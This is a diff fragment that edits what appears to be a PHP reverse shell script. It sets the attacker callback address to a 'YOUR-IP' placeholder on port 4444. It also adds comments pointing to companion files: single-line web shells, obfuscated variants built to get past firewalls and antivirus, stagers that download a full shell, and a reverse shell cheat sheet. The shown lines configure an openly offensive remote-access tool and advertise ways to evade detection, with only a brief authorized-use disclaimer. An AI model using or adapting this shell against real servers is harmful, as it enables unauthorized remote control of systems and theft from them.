@@ -44,10 +44,17 @@
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
+// Companion files in this folder:
+//   php-reverse-shell-one-liners.txt      -> single-line PHP shells (CLI & web)
+//   php-reverse-shell-bypass.txt          -> WAF/AV-bypass obfuscated variants
+//   php-reverse-shell-stagers.txt         -> tiny starters that pull a full shell
+//   reverse.md                            -> multi-language reverse shell cheat sheet
+// Test EVERY reverse shell from your own host ONLY. Authorized targets only.
+
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = 'YOUR-IP';    // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
